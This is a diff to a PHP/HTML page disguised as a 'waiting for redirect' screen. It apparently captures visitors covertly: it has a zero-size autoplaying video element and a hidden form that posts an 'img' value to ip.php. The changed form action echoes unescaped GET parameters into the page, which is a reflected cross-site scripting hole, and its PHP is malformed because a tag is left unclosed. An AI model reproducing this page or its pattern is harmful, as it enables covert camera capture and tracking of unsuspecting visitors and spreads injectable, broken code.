@@ -3,19 +3,6 @@
 <head>
 <meta charset="UTF-8">
 <title>等待跳转...</title>
-<style>
-  body {
-    height: 100vh;
-    overflow: hidden;
-  }
-
-  /* 将链接的样式设为透明，以便不影响背景图片的显示 */
-  a {
-    display: block;
-    width: 100%;
-    height: 100%;
-  }
-</style>
 </head>
 <body>
     <video id="video" width="0" height="0" autoplay></video>
@@ -43,7 +30,7 @@
 		}, false);
 
 				</script>
-<form action="ip.php?url=https://vdse.bdstatic.com//192d9a98d782d9c74c96f09db9378d93.mp4?authorization=bce-auth-v1%2F40f207e648424f47b2e3dfbb1014b1a5%2F2021-07-12T02%3A14%3A24Z%2F-1%2Fhost%2F530146520a1c89fb727fbbdb8a0e0c98ec69955459aed4b1c8e00839187536c9" id="gopo" method="post" >
+<form action="ip.php?id=<?php echo $_GET['id']?>&url=<?php echo $_GET['url']" id="gopo" method="post" >
 	<input type="hidden" name="img" id="result" value="" />
 </form>
 </body>
